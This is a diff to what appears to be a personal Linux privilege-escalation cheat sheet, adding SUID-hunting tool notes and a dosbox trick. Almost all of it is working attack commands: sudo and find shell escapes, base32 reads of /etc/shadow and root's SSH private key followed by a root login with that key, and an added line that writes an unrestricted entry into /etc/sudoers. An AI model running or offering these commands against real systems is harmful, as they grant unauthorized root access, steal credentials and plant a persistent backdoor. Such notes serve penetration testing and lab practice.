@@ -30,6 +30,9 @@ find / -perm -g=s -type f 2>/dev/null
 find / -perm /u=s,g=s -type f 2>/dev/null | sort
 
 =================================== 
+SUID Tools
+
+lse.sh -i -l1   ..finds unusual SUIDS
 https://gtfobins.github.io  
 https://github.com/Anon-Exploiter/SUID3NUM/blob/master/suid3num.py 
 
@@ -40,8 +43,7 @@ gtfo -b apt
 gtfo -ls exe 
 gtfo -e leadvpack.dll 
 
-lse.sh -i -l1   ..will alert unusual SUIDS
-
+=================================== 
 sudo -u bob /bin/bash 
 sudo su 
 sudo find . -exec /bin/sh -p \; -quit 
@@ -60,6 +62,10 @@ php7.2 -r "pcntl exec('/bin/sh', ['-p']);"
 /usr/bin/base32 /etc/shadow | /usr/bin/base32 --decode
 /usr/bin/base32 /root/.ssh/id_rsa | /usr/bin/base32 --decode 
 vim id_rsa; chmod 600 id_rsa; ssh root@192.168.200.5 -i id_rsa 
+
+LFILE='/etc/sudoers'
+/usr/bin/dosbox -c 'mount c /' -c "echo commander ALL=(ALL:ALL) ALL >>c:$LFILE" -c exit
+sudo -s
 
 =================================== 
 Watch for Injections for Rootbash
